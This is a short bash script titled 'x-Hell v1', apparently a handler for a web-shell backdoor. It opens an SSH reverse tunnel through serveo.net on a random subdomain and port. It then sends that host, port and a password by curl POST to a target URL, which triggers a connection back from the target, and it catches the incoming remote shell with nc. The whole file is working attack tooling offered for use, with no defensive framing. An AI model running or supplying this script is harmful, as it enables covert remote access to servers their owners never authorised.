#!/bin/bash
function check_command {
    if [ "$(command -v $1)" = "" ]; then
        echo "[-] Command \"$1\" not found..."
        exit 1
    fi
}
check_command ssh
check_command curl
check_command nc
echo "+ x-Hell v1 +"
echo
read -p "URL: " url
read -p "Password: " pass
echo
echo "[+] Generating random host and port..."
str=$(head /dev/urandom | tr -dc a-z | head -c 5)
if [ -x $(command -v mktemp) ]; then
    temp=$(mktemp)
elif [ -x $(command -v tempfile) ]; then
    temp=$(tempfile)
else
    echo "[-] Command \"mktemp\" and \"tempfile\" not found..."
    exit 1
fi
host="$str.serveo.net"
port=$(shuf -i 1024-9999 -n 1)
echo "[+] Creating tempfile..."
cat > $temp << EOF
sleep 3
curl -s -X POST --data "xhost=$host&xport=$port&xpass=$pass" $url 2>/dev/null 2<&1
EOF
echo "[+] Creating request to serveo.net..."
ssh -o StrictHostKeyChecking=no -R $host:$port:localhost:$port serveo.net > /dev/null 2>&1 &
echo "[+] Connecting to serveo.net..."
sleep 2
echo "[+] Executing tempfile..."
bash $temp &
echo "[+] Listening..."
nc -vlp $port
